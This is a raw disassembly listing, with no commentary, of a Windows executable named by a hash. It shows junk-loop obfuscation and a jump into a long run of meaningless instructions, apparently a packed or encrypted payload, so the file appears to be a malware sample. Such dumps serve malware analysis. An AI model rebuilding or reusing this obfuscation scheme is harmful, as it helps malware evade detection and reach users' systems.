
3d5c411977dc54a124b46ef502e6e3fce190aed21b98430548c891af3a2b18b3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e89,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e89,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9d,0x10
  401025:	cmp    DWORD PTR ds:0x428e9d,0x0
  40102c:	je     0x401092
  401032:	cmp    DWORD PTR ds:0x428e9d,0x3
  401039:	jle    0x401092
  40103f:	jmp    0x401066
  401044:	push   0x559d
  401049:	push   0x2a1f
  40104e:	push   0x41ed
  401053:	push   DWORD PTR [ebp-0x1c]
  401056:	push   0x428124
  40105b:	push   0x44ac
  401060:	call   DWORD PTR ds:0x42ca10
  401066:	cmp    DWORD PTR ds:0x428e9d,0x4
  40106d:	jne    0x401080
  401073:	mov    edi,DWORD PTR ds:0x428e9d
  401079:	dec    edi
  40107a:	mov    DWORD PTR ds:0x428e9d,edi
  401080:	mov    edi,DWORD PTR ds:0x428e9d
  401086:	dec    edi
  401087:	mov    DWORD PTR ds:0x428e9d,edi
  40108d:	jmp    0x401025
  401092:	mov    esi,0x75108b1
  401097:	mov    DWORD PTR ds:0x428e91,0x16
  4010a1:	cmp    DWORD PTR ds:0x428e91,0x0
  4010a8:	je     0x4010ef
  4010ae:	cmp    DWORD PTR ds:0x428e91,0x25
  4010b5:	jge    0x4010ef
  4010bb:	jmp    0x4010dd
  4010c0:	push   DWORD PTR [ebp-0x20]
  4010c3:	push   0x1b69
  4010c8:	push   0x4c28
  4010cd:	push   0x78bb
  4010d2:	push   0x428ec1
  4010d7:	call   DWORD PTR ds:0x42ca14
  4010dd:	mov    ecx,DWORD PTR ds:0x428e91
  4010e3:	dec    ecx
  4010e4:	mov    DWORD PTR ds:0x428e91,ecx
  4010ea:	jmp    0x4010a1
  4010ef:	xor    eax,esi
  4010f1:	or     ecx,DWORD PTR ds:0x428e95
  4010f7:	mov    edi,0x3272f8
  4010fc:	add    eax,edi
  4010fe:	xor    ecx,DWORD PTR ds:0x428e61
  401104:	mov    DWORD PTR [ebp-0x40],eax
  401107:	mov    ecx,DWORD PTR ds:0x428ef5
  40110d:	mov    eax,ds:0x42a075
  401112:	sub    eax,ecx
  401114:	sub    ecx,DWORD PTR [ecx+eax*1]
  401117:	mov    eax,ds:0x4281e5
  40111c:	or     ecx,0x6919
  401122:	mov    eax,DWORD PTR [eax]
  401124:	mov    DWORD PTR [ebp-0x3c],eax
  401127:	mov    eax,ds:0x4283f5
  40112c:	xor    ecx,0x14c1
  401132:	mov    eax,DWORD PTR [eax]
  401134:	mov    DWORD PTR [ebp-0x1c],eax
  401137:	and    DWORD PTR ds:0x428e75,0x31f0
  401141:	mov    DWORD PTR [ebp-0x34],0xf89c87b9
  401148:	or     ecx,ecx
  40114a:	mov    eax,DWORD PTR [ebp-0x34]
  40114d:	xor    eax,esi
  40114f:	add    eax,edi
  401151:	mov    DWORD PTR [ebp-0x40],eax
  401154:	and    DWORD PTR ds:0x428eb9,0x0
  40115e:	jmp    0x401170
  401163:	mov    ecx,DWORD PTR ds:0x428eb9
  401169:	inc    ecx
  40116a:	mov    DWORD PTR ds:0x428eb9,ecx
  401170:	cmp    DWORD PTR ds:0x428eb9,0x1c
  401177:	jae    0x4011a0
  40117d:	cmp    DWORD PTR ds:0x428eb9,0x21
  401184:	jl     0x4011a0
  40118a:	jmp    0x40119b
  40118f:	push   DWORD PTR [ebp-0xc]
  401192:	push   DWORD PTR [ebp-0x18]
  401195:	call   DWORD PTR ds:0x42ca18
  40119b:	jmp    0x401163
  4011a0:	mov    eax,ds:0x428365
  4011a5:	or     DWORD PTR ds:0x428eb1,0x3218
  4011af:	mov    DWORD PTR [ebp-0x40],eax
  4011b2:	mov    DWORD PTR ds:0x428e69,0x16
  4011bc:	cmp    DWORD PTR ds:0x428e69,0x0
  4011c3:	je     0x401218
  4011c9:	cmp    DWORD PTR ds:0x428e69,0xb
  4011d0:	jg     0x401218
  4011d6:	jmp    0x4011ec
  4011db:	push   0x42804e
  4011e0:	push   DWORD PTR [ebp-0x24]
  4011e3:	push   DWORD PTR [ebp-0x24]
  4011e6:	call   DWORD PTR ds:0x42ca4c
  4011ec:	cmp    DWORD PTR ds:0x428e69,0xc
  4011f3:	jne    0x401206
  4011f9:	mov    ecx,DWORD PTR ds:0x428e69
  4011ff:	dec    ecx
  401200:	mov    DWORD PTR ds:0x428e69,ecx
  401206:	mov    ecx,DWORD PTR ds:0x428e69
  40120c:	dec    ecx
  40120d:	mov    DWORD PTR ds:0x428e69,ecx
  401213:	jmp    0x4011bc
  401218:	mov    eax,DWORD PTR [ebp-0x3c]
  40121b:	sbb    DWORD PTR ds:0x428ea5,0x6db4
  401225:	mov    DWORD PTR [ebp-0x14],eax
  401228:	mov    eax,DWORD PTR [ebp-0x14]
  40122b:	movzx  ecx,BYTE PTR ds:0x428e45
  401232:	xor    ecx,DWORD PTR ds:0x428e79
  401238:	mov    DWORD PTR ds:0x428e45,ecx
  40123e:	jmp    0x403595
  401243:	lods   eax,DWORD PTR ds:[esi]
  401244:	ins    DWORD PTR es:[edi],dx
  401245:	call   0x9776:0xb1685a84
  40124c:	xchg   ebx,eax
  40124d:	add    bh,cl
  40124f:	cli    
  401250:	xchg   edi,eax
  401251:	and    ecx,DWORD PTR [ebx+edi*2-0x4a848485]
  401258:	sahf   
  401259:	jnp    0x4012d6
  40125b:	aam    0xcd
  40125d:	(bad)  
  40125e:	rcr    al,0xc4
  401261:	fcmove st,st(6)
  401263:	test   cl,al
  401265:	mov    BYTE PTR [edi-0x7473726d],al
  40126b:	mov    WORD PTR [ebx-0x6effe2dc],?
  401271:	test   eax,0x519a808a
  401276:	or     DWORD PTR [eax+ebx*4-0x3e5463d2],0x7766fb6d
  401281:	xchg   esi,eax
  401282:	lods   al,BYTE PTR ds:[esi]
  401283:	jle    0x40123b
  401285:	jno    0x4012ce
  401287:	jle    0x4012ca
  401289:	inc    ebx
  40128a:	mov    edx,0x1d87fecd
  40128f:	sti    
  401290:	xchg   edx,eax
  401291:	jle    0x401272
  401293:	or     al,0xb8
  401295:	sub    al,0x3b
  401297:	or     al,0x66
  401299:	rcr    BYTE PTR [edi],cl
  40129b:	push   0xffffffc8
  40129d:	out    dx,al
  40129e:	cwde   
  40129f:	dec    edx
  4012a0:	imul   esp,DWORD PTR ds:0xe51c8cf6,0x15
  4012a7:	out    dx,eax
  4012a8:	sti    
  4012a9:	(bad)  
  4012aa:	fldcw  WORD PTR [ecx-0x76753813]
  4012b0:	cmp    BYTE PTR [esi-0x2e],cl
  4012b3:	mov    al,ds:0x8fe47e4
  4012b8:	test   al,0xca
  4012ba:	jne    0x40126f
  4012bc:	sub    DWORD PTR [edx+0x79fbdbf8],ebx
  4012c2:	inc    eax
  4012c3:	sbb    BYTE PTR [ecx+ebx*2],0x9e
  4012c7:	push   0x40
  4012c9:	out    0xd5,al
  4012cb:	arpl   WORD PTR [eax+0x73bd5ff2],si
  4012d1:	jb     0x4012bd
  4012d3:	sbb    ecx,esp
  4012d5:	xchg   ebx,eax
  4012d6:	ins    BYTE PTR es:[edi],dx
  4012d7:	mov    ch,0xb2
  4012d9:	xchg   ebp,eax
  4012da:	add    ch,BYTE PTR [esi]
  4012dc:	imul   ecx,eax,0x68
  4012df:	xor    DWORD PTR [esi],esi
  4012e1:	sub    eax,0xa4059069
  4012e6:	xchg   ebx,eax
  4012e7:	lods   eax,DWORD PTR ds:[esi]
  4012e8:	in     eax,dx
  4012e9:	mov    edi,0x4ce2b7f2
  4012ee:	stos   BYTE PTR es:[edi],al
  4012ef:	sub    eax,DWORD PTR [esi-0x4f]
  4012f2:	and    ebp,esp
  4012f4:	xchg   edi,eax
  4012f5:	cld    
  4012f6:	xchg   ebx,eax
  4012f7:	xchg   edi,eax
  4012f8:	inc    esp
  4012f9:	clc    
  4012fa:	mov    DWORD PTR [esi],edi
  4012fc:	stc    
  4012fd:	mov    ds:0x770ed9e0,eax
  401302:	jb     0x4012ce
  401304:	cmp    esp,edi
  401306:	cmp    BYTE PTR [esi-0x80],bh
  401309:	dec    BYTE PTR [esi+0x37]
  40130c:	dec    ebx
  40130d:	jb     0x401387
  40130f:	mov    DWORD PTR [ebx-0x69],0x2df3f6b2
  401316:	lea    ebx,[ebx-0x1cb8ec4e]
  40131c:	sbb    BYTE PTR [esi-0x32],ah
  40131f:	or     eax,0x26efa41c
  401324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401325:	(bad)  
  401326:	bnd ret 0x85f1
  40132a:	jge    0x401314
  40132c:	shr    DWORD PTR [edi],1
  40132e:	push   ecx
  40132f:	mov    ch,0x2
  401331:	xchg   ebp,eax
  401332:	leave  
  401333:	or     esi,edx
  401335:	je     0x4012e3
  401337:	jno    0x401382
  401339:	push   0xfffffff0
  40133b:	xlat   BYTE PTR ds:[ebx]
  40133c:	dec    BYTE PTR [eax]
  40133e:	adc    al,BYTE PTR [edi+edx*2-0x7c]
  401342:	mov    al,0xfc
  401344:	pop    ds
  401345:	mov    edi,0xdf96d14
  40134a:	addr16 dec edx
  40134c:	jne    0x4012e3
  40134e:	cli    
  40134f:	je     0x4012fe
  401351:	cmp    DWORD PTR [ebp-0x13],ebp
  401354:	out    dx,eax
  401355:	xchg   esp,eax
  401356:	and    ecx,esi
  401358:	or     cl,bl
  40135a:	push   ebx
  40135b:	fild   WORD PTR [esi-0x57]
  40135e:	dec    ebp
  40135f:	aam    0xae
  401361:	push   esp
  401362:	leave  
  401363:	stos   BYTE PTR es:[edi],al
  401364:	inc    ebx
  401365:	push   ebx
  401366:	loope  0x40132a
  401368:	inc    BYTE PTR [eax-0x36e22a1b]
  40136e:	mov    ebp,0xde7e5575
  401373:	or     al,0x47
  401375:	cmp    DWORD PTR [eax+0x50],esp
  401378:	mov    ds,WORD PTR [edi-0x55]
  40137b:	and    ebx,edx
  40137d:	cwde   
  40137e:	fwait
  40137f:	or     dh,BYTE PTR [ecx]
  401381:	sbb    al,0x23
  401383:	shr    DWORD PTR [edi+0xde6b851],cl
  401389:	ds jne 0x401351
  40138c:	push   ebp
  40138d:	xor    bl,BYTE PTR ds:0x7f26fe9d
  401393:	es dec ecx
  401395:	dec    ebp
  401396:	std    
  401397:	out    dx,al
  401398:	test   DWORD PTR [esi-0x2b],edi
  40139b:	mov    eax,ds:0xc28f2171
  4013a0:	(bad)  
  4013a1:	push   esp
  4013a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013a3:	jb     0x4013db
  4013a5:	add    ebp,edi
  4013a7:	mov    ss,ebx
  4013a9:	inc    ebx
  4013aa:	scas   eax,DWORD PTR es:[edi]
  4013ab:	sbb    edi,DWORD PTR [esi-0x11023d30]
  4013b1:	or     al,0x63
  4013b3:	stos   DWORD PTR es:[edi],eax
  4013b4:	push   edx
  4013b5:	ja     0x40140e
  4013b7:	dec    ebp
  4013b8:	mov    eax,0x8217c3f8
  4013bd:	and    al,0xa9
  4013bf:	cmp    al,0xb8
  4013c1:	sub    bl,BYTE PTR [eax-0x7b]
  4013c4:	enter  0xc48b,0xef
  4013c8:	xlat   BYTE PTR ds:[ebx]
  4013c9:	adc    ebp,DWORD PTR [ebx+0x43]
  4013cc:	call   0x1f51:0xf25ba948
  4013d3:	xor    DWORD PTR [edx+ebx*4-0x2e4300df],edi
  4013da:	xor    eax,0x76bc615e
  4013df:	dec    DWORD PTR [edx]
  4013e1:	stos   DWORD PTR es:[edi],eax
  4013e2:	popa   
  4013e3:	adc    ch,BYTE PTR [ebp-0x6b]
  4013e6:	sar    BYTE PTR [eax+0x4bde0761],cl
  4013ec:	mov    edi,0xb3831e1c
  4013f1:	dec    ecx
  4013f2:	mov    bh,0xf4
  4013f4:	in     eax,dx
  4013f5:	adc    eax,0x6756e9d8
  4013fa:	add    eax,DWORD PTR [ecx+edi*4]
  4013fd:	rcr    BYTE PTR [ecx-0x95f93fd],0x52
  401404:	cli    
  401405:	sub    esp,esi
  401407:	(bad)  
  401408:	push   cs
  401409:	in     al,dx
  40140a:	popa   
  40140b:	mov    edx,DWORD PTR [bp+si+0x52]
  40140f:	sbb    ebp,edx
  401411:	mov    ebp,0xe2d6a9b3
  401416:	and    esi,esp
  401418:	int    0x2f
  40141a:	push   es
  40141b:	mov    ch,ch
  40141d:	xchg   BYTE PTR [esi-0x4b],al
  401420:	sbb    eax,0xf4802b37
  401425:	call   0x607a:0x290a1873
  40142c:	jl     0x401490
  40142e:	out    dx,al
  40142f:	mov    al,ds:0x677da63f
  401434:	mov    esp,0x18049771
  401439:	xchg   ecx,eax
  40143a:	mov    dh,0xe8
  40143c:	pop    es
  40143d:	pop    edi
  40143e:	jl     0x40142f
  401440:	and    al,0x1e
  401442:	add    al,0x11
  401444:	xor    eax,0x55478ba5
  401449:	and    DWORD PTR [ebx-0x196b3147],0x9488f7a6
  401453:	mov    DWORD PTR [esi],ecx
  401455:	xchg   ebx,eax
  401456:	jge    0x40148a
  401458:	push   ss
  401459:	dec    ebp
  40145a:	push   ss
  40145b:	repz shl eax,0x7f
  40145f:	popf   
  401460:	sbb    cl,BYTE PTR [esi+0x1f]
  401463:	cmp    eax,0x8ecf4e93
  401468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401469:	retf   
  40146a:	test   al,0xee
  40146c:	scas   eax,DWORD PTR es:[edi]
  40146d:	mov    bl,0xca
  40146f:	add    ah,cl
  401471:	sub    eax,0x7489f440
  401476:	test   al,0x4b
  401478:	mov    ch,0x2c
  40147a:	or     DWORD PTR [eax+0x63],esp
  40147d:	fdivr  st(5),st
  40147f:	(bad)  
  401480:	mov    cl,0x2d
  401482:	(bad)  
  401483:	xor    DWORD PTR [edx+0x195a024],edx
  401489:	loopne 0x40142f
  40148b:	out    0x39,eax
  40148d:	jbe    0x4014cf
  40148f:	sub    al,0x27
  401491:	mov    ds:0x1b14a11d,eax
  401496:	lock cld 
  401498:	add    al,0x26
  40149a:	xor    bl,al
  40149c:	test   edi,ebp
  40149e:	adc    DWORD PTR [eax-0x72],esp
  4014a1:	cli    
  4014a2:	inc    ebp
  4014a3:	mov    ds:0x17603fe8,eax
  4014a8:	imul   DWORD PTR [ecx]
  4014aa:	lahf   
  4014ab:	lods   eax,DWORD PTR ds:[esi]
  4014ac:	inc    esp
  4014ad:	retf   0x5df1
  4014b0:	jae    0x401524
  4014b2:	jne    0x40144b
  4014b4:	rcl    al,0xbd
  4014b7:	fdiv   QWORD PTR [edx+edi*2+0x21]
  4014bb:	btr    DWORD PTR [ebp+0x4d],ebx
  4014bf:	pusha  
  4014c0:	ret    
  4014c1:	aaa    
  4014c2:	out    dx,al
  4014c3:	(bad)  [edi+ecx*1+0x67]
  4014c7:	lahf   
  4014c8:	add    BYTE PTR [esi],dl
  4014ca:	cld    
  4014cb:	pop    ss
  4014cc:	adc    al,0x31
  4014ce:	data16 clc 
  4014d0:	test   al,0xbd
  4014d2:	inc    esp
  4014d3:	stc    
  4014d4:	mov    ch,0xbe
  4014d6:	push   esp
  4014d7:	inc    esp
  4014d8:	mov    eax,ds
  4014da:	sahf   
  4014db:	inc    esp
  4014dc:	dec    dx
  4014de:	push   esp
  4014df:	push   0x22d4582d
  4014e4:	retf   
  4014e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014e6:	sbb    eax,0x3668dd20
  4014eb:	pop    es
  4014ec:	int    0x81
  4014ee:	jl     0x4014a6
  4014f0:	iret   
  4014f1:	mov    edi,0xbdd5e379
  4014f6:	mov    ebp,ss
  4014f8:	out    0xf7,al
  4014fa:	sub    al,0x94
  4014fc:	fwait
  4014fd:	lahf   
  4014fe:	retf   
  4014ff:	push   ecx
  401500:	mov    eax,ds:0x3a700325
  401505:	loope  0x401534
  401507:	and    DWORD PTR [esi-0x4039dd50],ebp
  40150d:	push   esp
  40150e:	dec    edi
  40150f:	mov    cl,bh
  401511:	das    
  401512:	adc    al,0x2b
  401514:	retf   0xcdca
  401517:	outs   dx,DWORD PTR ds:[esi]
  401518:	lock enter 0x9bf5,0x81
  40151d:	(bad)  
  40151e:	addr16 jmp 0x401508
  401521:	pusha  
  401522:	add    bh,BYTE PTR [esi+0x16]
  401525:	sub    DWORD PTR [edi+0x47],ebp
  401528:	adc    BYTE PTR [esi+0x62],0x61
  40152c:	mov    cl,0x4e
  40152e:	push   ecx
  40152f:	mov    al,0xc4
  401531:	jmp    0xad76:0x74341fa9
  401538:	push   edx
  401539:	test   eax,0xcc728b4a
  40153e:	shl    DWORD PTR [edx-0x32],0x59
  401542:	inc    ebp
  401543:	add    BYTE PTR [edx-0x1c],ah
  401546:	fstp   QWORD PTR [ecx+0x39]
  401549:	addr16 or al,0xe2
  40154c:	cmp    DWORD PTR cs:[edx+ecx*8],ebp
  401550:	repz mov esp,DWORD PTR [ebp+0x583498ac]
  401557:	push   edi
  401558:	rol    DWORD PTR [esi+0x69a9a5c6],0x6e
  40155f:	jmp    0xfa190105
  401564:	xlat   BYTE PTR ds:[ebx]
  401565:	sub    DWORD PTR [ebx+0x7c],ebp
  401568:	jp     0x401562
  40156a:	xor    DWORD PTR [ecx+0x6e],0xebd74b40
  401571:	pop    edx
  401572:	mov    dl,0xe3
  401574:	lock jae 0x4014ff
  401577:	jecxz  0x401591
  401579:	xchg   ebx,eax
  40157a:	mov    al,0xe9
  40157c:	out    dx,eax
  40157d:	(bad)  
  40157e:	inc    edx
  40157f:	inc    edi
  401580:	faddp  st(3),st
  401582:	daa    
  401583:	cmp    DWORD PTR [esi],edx
  401585:	or     al,0xb
  401587:	xchg   esi,eax
  401588:	mov    ch,0x84
  40158a:	and    edx,DWORD PTR [esi+eax*2+0x146f7bd9]
  401591:	dec    esi
  401592:	(bad)  
  401593:	jecxz  0x4015f6
  401595:	shl    DWORD PTR [ebp-0x3491b1cb],0xed
  40159c:	out    dx,al
  40159d:	or     edi,esi
  40159f:	xchg   esi,eax
  4015a0:	clc    
  4015a1:	mov    ebp,0xe1a40db1
  4015a6:	repz dec esi
  4015a8:	mov    cl,0x16
  4015aa:	jmp    0x4015f7
  4015ac:	sbb    eax,0x12184663
  4015b1:	aas    
  4015b2:	sbb    BYTE PTR [esi],bh
  4015b4:	dec    esp
  4015b5:	test   DWORD PTR [edx+0x347d4bfb],ebp
  4015bb:	or     BYTE PTR [eax+ebx*8+0x23],al
  4015bf:	sub    al,0xfe
  4015c1:	sub    cl,BYTE PTR [esi+0x21210e3a]
  4015c7:	inc    ecx
  4015c8:	add    BYTE PTR [eax+0x41],0xb7
  4015cc:	jl     0x40156e
  4015ce:	adc    bl,cl
  4015d0:	and    ebp,DWORD PTR [edx+edi*1+0x3afa4a21]
  4015d7:	jno    0x4015e8
  4015d9:	inc    esi
  4015da:	and    DWORD PTR [edx],edi
  4015dc:	sahf   
  4015dd:	sbb    BYTE PTR [edi+edx*1],0xaf
  4015e1:	outs   dx,DWORD PTR ds:[esi]
  4015e2:	push   0x356dde90
  4015e7:	or     dh,al
  4015e9:	sbb    eax,0x1dc662d6
  4015ee:	add    ebp,DWORD PTR [edi]
  4015f0:	sbb    bl,dl
  4015f2:	aad    0x3d
  4015f4:	push   esp
  4015f5:	lods   eax,DWORD PTR ds:[esi]
  4015f6:	push   ebp
  4015f7:	clc    
  4015f8:	rcl    BYTE PTR ds:0xd72c315c,1
  4015fe:	ret    0x6745
  401601:	lahf   
  401602:	sbb    ebp,esp
  401604:	dec    eax
  401605:	push   ss
  401606:	mov    bl,0x67
  401608:	push   cs
  401609:	sbb    DWORD PTR [ebx],eax
  40160b:	outs   dx,BYTE PTR ds:[esi]
  40160c:	push   edx
  40160d:	fld    DWORD PTR [esi+0x74]
  401610:	bound  edi,QWORD PTR [ecx+0x39]
  401613:	mov    ebp,0xf722d9e
  401618:	adc    DWORD PTR [ecx-0x32],esi
  40161b:	pop    ds
  40161c:	pushf  
  40161d:	loope  0x40164d
  40161f:	xor    al,0xae
  401621:	cmp    DWORD PTR [esi+eiz*4-0x44],0xffffffd3
  401626:	pop    edx
  401627:	shr    DWORD PTR [ebx+0x58],0xcc
  40162b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40162c:	(bad)  
  40162d:	sar    esi,cl
  40162f:	and    dl,ah
  401631:	xchg   edx,eax
  401632:	xchg   edi,ebx
  401634:	popa   
  401635:	pushf  
  401636:	pusha  
  401637:	into   
  401638:	fidiv  DWORD PTR [edx-0x36]
  40163b:	sub    edx,edi
  40163d:	arpl   WORD PTR [edi],ax
  40163f:	sub    esi,DWORD PTR [edx]
  401641:	push   cs
  401642:	jge    0x401609
  401644:	fild   DWORD PTR [eax-0x42]
  401647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401648:	sbb    eax,0xe634e17d
  40164d:	or     eax,0x22573405
  401652:	pop    es
  401653:	ds jnp 0x401613
  401656:	push   ecx
  401657:	xchg   BYTE PTR [ebx],cl
  401659:	pop    ebx
  40165a:	jne    0x4016bb
  40165c:	(bad)
  40165f:	jns    0x2295d9ba
  401665:	xor    eax,0x91e27d34
  40166a:	out    0x88,al
  40166c:	or     DWORD PTR [ebx+0x7587b66c],ebp
  401672:	in     al,dx
  401673:	xchg   esp,eax
  401674:	add    al,bl
  401676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401677:	mov    DWORD PTR [ebx],ecx
  401679:	sti    
  40167a:	sub    ebx,DWORD PTR ds:0xee5f2c03
  401680:	cmc    
  401681:	cmp    BYTE PTR ds:0xd11d118b,bl
  401687:	jae    0x4016ce
  401689:	pop    eax
  40168a:	cdq    
  40168b:	test   al,0x69
  40168d:	jp     0x40169d
  40168f:	mov    cs,edi
  401691:	inc    ebx
  401692:	retf   
  401693:	(bad)  
  401694:	repnz mov ds:0x6d6af209,al
  40169a:	fldcw  WORD PTR [edi+0x7a]
  40169d:	sbb    eax,0x33755e53
  4016a2:	sbb    al,ch
  4016a4:	imul   ebp,DWORD PTR [edi],0xfba0a8e8
  4016aa:	xchg   esp,eax
  4016ab:	cmp    ebp,ebp
  4016ad:	gs popf 
  4016af:	xchg   DWORD PTR [esi-0x61],eax
  4016b2:	fild   DWORD PTR [ecx-0x4d]
  4016b5:	ds push cs
  4016b7:	addr16 call 0xf6a1:0x909e9012
  4016bf:	jae    0x4016cf
  4016c1:	js     0x401691
  4016c3:	iret   
  4016c4:	mov    edx,0xf8e17854
  4016c9:	mov    ebx,0xf2a845e7
  4016ce:	ret    0x34b
  4016d1:	int3   
  4016d2:	or     eax,DWORD PTR [ecx]
  4016d4:	jmp    0xc162:0x4f5eee67
  4016db:	shl    DWORD PTR [ecx],0x80
  4016de:	push   ss
  4016df:	rol    edi,0xae
  4016e2:	and    DWORD PTR [ecx-0x1727a823],ebx
  4016e8:	das    
  4016e9:	pop    ebp
  4016ea:	mov    eax,ds:0xffd9e8d0
  4016ef:	push   0xa10c485d
  4016f4:	popa   
  4016f5:	aaa    
  4016f6:	leave  
  4016f7:	es pop ss
  4016f9:	adc    bh,BYTE PTR [ebp+0x5241e31c]
  4016ff:	cwde   
  401700:	dec    ecx
  401701:	sbb    al,0x2d
  401703:	dec    ebp
  401704:	popa   
  401705:	pop    edx
  401706:	push   ds
  401707:	nop
  401708:	sub    al,0xb7
  40170a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40170b:	sub    eax,0xa31ce36d
  401710:	xor    al,0x64
  401712:	sub    eax,0x4d298926
  401717:	adc    al,0xf9
  401719:	loopne 0x4016b6
  40171b:	out    0x15,eax
  40171d:	mov    edx,0x4947ed7f
  401722:	sub    ch,ch
  401724:	sbb    al,0x1e
  401726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401727:	(bad)  
  401728:	dec    ebx
  401729:	std    
  40172a:	mov    ebp,0x678cf34a
  40172f:	aaa    
  401730:	adc    al,0xde
  401732:	mov    bh,0x90
  401734:	pop    esp
  401735:	jne    0x40175d
  401737:	inc    eax
  401738:	daa    
  401739:	outs   dx,BYTE PTR ds:[esi]
  40173a:	fwait
  40173b:	sub    al,0xd4
  40173d:	shl    DWORD PTR [ebp+ebx*4-0x3d],cl
  401741:	or     BYTE PTR [esi],ch
  401743:	mov    gs,edx
  401745:	pop    eax
  401746:	aad    0x90
  401748:	add    eax,0x45b204b7
  40174d:	adc    BYTE PTR [esi-0x21e8319a],dh
  401753:	and    BYTE PTR [edx-0x2830a6ae],0xa2
  40175a:	les    edi,FWORD PTR [esi-0x57]
  40175d:	fxtract 
  40175f:	pushw  es
  401761:	pop    ss
  401762:	aad    0x0
  401764:	lods   al,BYTE PTR ds:[esi]
  401765:	jmp    0x40171a
  401767:	outs   dx,BYTE PTR ds:[esi]
  401768:	mov    edx,0xfabce652
  40176d:	in     eax,0x45
  40176f:	retf   
  401770:	or     esi,DWORD PTR [ebx]
  401772:	sti    
  401773:	cs stos DWORD PTR es:[edi],eax
  401775:	out    dx,eax
  401776:	adc    DWORD PTR [bp+0x20],0xce463c0c
  40177e:	inc    esi
  40177f:	(bad)  
  401780:	pop    edx
  401781:	xor    cl,BYTE PTR [ecx]
  401783:	fist   DWORD PTR [edx+edx*8+0x51]
  401787:	or     al,0x13
  401789:	jb     0x40172b
  40178b:	idiv   al
  40178d:	push   esi
  40178e:	mov    al,ds:0x7a88592b
  401793:	mov    ebx,0xea5b9fb4
  401798:	jbe    0x40171b
  40179a:	jmp    0xb3cde6e9
  40179f:	test   DWORD PTR [ecx-0x47],edx
  4017a2:	scas   al,BYTE PTR es:[edi]
  4017a3:	xchg   DWORD PTR [edx+0xd],esi
  4017a6:	xor    eax,DWORD PTR [edi+ecx*8]
  4017a9:	inc    ebp
  4017aa:	mov    al,0xd7
  4017ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ad:	(bad)  
  4017ae:	aam    0xbc
  4017b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017b1:	adc    al,0x35
  4017b3:	pop    ecx
  4017b4:	push   ds
  4017b5:	pop    edx
  4017b6:	inc    edi
  4017b7:	or     eax,0x3b3eb4e6
  4017bc:	loopne 0x4017cc
  4017be:	jle    0x401825
  4017c0:	stos   BYTE PTR es:[edi],al
  4017c1:	adc    eax,0xdcee1d65
  4017c6:	call   0xb5096150
  4017cb:	xchg   edi,eax
  4017cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017cd:	dec    ecx
  4017ce:	cmp    eax,0x5753fab8
  4017d3:	aaa    
  4017d4:	fwait
  4017d5:	sbb    BYTE PTR [edx-0x2c],dl
  4017d8:	jae    0x401811
  4017da:	add    DWORD PTR [edx+eiz*1-0x4fd45bdc],edx
  4017e1:	dec    ecx
  4017e2:	inc    edi
  4017e3:	or     al,0x46
  4017e5:	popa   
  4017e6:	cmp    eax,0xeb8ea505
  4017eb:	pop    eax
  4017ec:	inc    DWORD PTR [edx]
  4017ee:	push   0x6d
  4017f0:	outs   dx,DWORD PTR ds:[esi]
  4017f1:	cmp    esi,ebp
  4017f3:	test   cl,al
  4017f5:	add    ebx,DWORD PTR ds:0x94fca1d4
  4017fb:	gs cmp dh,ah
  4017fe:	out    0xbc,eax
  401800:	pop    ecx
  401801:	fcomp  DWORD PTR [edx+0x4e]
  401804:	push   esi
  401805:	mov    dl,0xb6
  401807:	or     al,BYTE PTR [eax+0x23]
  40180a:	dec    esi
  40180b:	mov    ah,BYTE PTR [ecx-0x67]
  40180e:	in     al,0x7c
  401810:	shl    BYTE PTR [ecx],0xf7
  401813:	bound  esi,QWORD PTR [ebx-0x17fd4876]
  401819:	or     BYTE PTR [esi],ch
  40181b:	mov    ds:0x55a15682,eax
  401820:	in     al,dx
  401821:	sub    DWORD PTR [esi-0x61],0x50483ac2
  401828:	mov    esp,0xcbe42da0
  40182d:	xor    DWORD PTR [ebp*1-0x610bf414],edx
  401834:	and    BYTE PTR [ebx+0x1f0f0cbd],dh
  40183a:	mov    bh,BYTE PTR ds:0x53d36c58
  401840:	cmp    DWORD PTR [ecx],ebp
  401842:	push   ebx
  401843:	add    esi,DWORD PTR [ecx-0x16]
  401846:	addr16 loope 0x4017cc
  401849:	stos   DWORD PTR es:[edi],eax
  40184a:	addr16 rcr ebx,0x8f
  40184e:	scas   al,BYTE PTR es:[edi]
  40184f:	iret   
  401850:	test   DWORD PTR ds:0xb3a02e3a,edi
  401856:	popa   
  401857:	xor    al,0x64
  401859:	push   ebx
  40185a:	sub    al,0xe0
  40185c:	mov    WORD PTR ds:0x1801,ds
  401861:	mov    ebx,0xd40cb118
  401866:	inc    edx
  401867:	add    ebp,DWORD PTR [edi+0x42]
  40186a:	ror    bl,cl
  40186c:	cmp    dl,BYTE PTR [ecx+0x20d6308]
  401872:	loopne 0x40189e
  401874:	scas   al,BYTE PTR es:[edi]
  401875:	out    0x7d,eax
  401877:	outs   dx,DWORD PTR ds:[esi]
  401878:	cmc    
  401879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40187a:	sub    ebp,ecx
  40187c:	ret    
  40187d:	ret    0x59db
  401880:	das    
  401881:	mov    ecx,0x4c9ae67a
  401886:	jp     0x4018ac
  401888:	jmp    0x5a2a:0xdfc6372a
  40188f:	xchg   ebp,eax
  401890:	sbb    BYTE PTR ds:0x5fe89d15,ah
  401896:	sub    DWORD PTR [edi-0x58e6db6c],0xe4944d8c
  4018a0:	rol    BYTE PTR [edi],cl
  4018a2:	pushf  
  4018a3:	rol    eax,0xfc
  4018a6:	mov    edi,0xdcf28dce
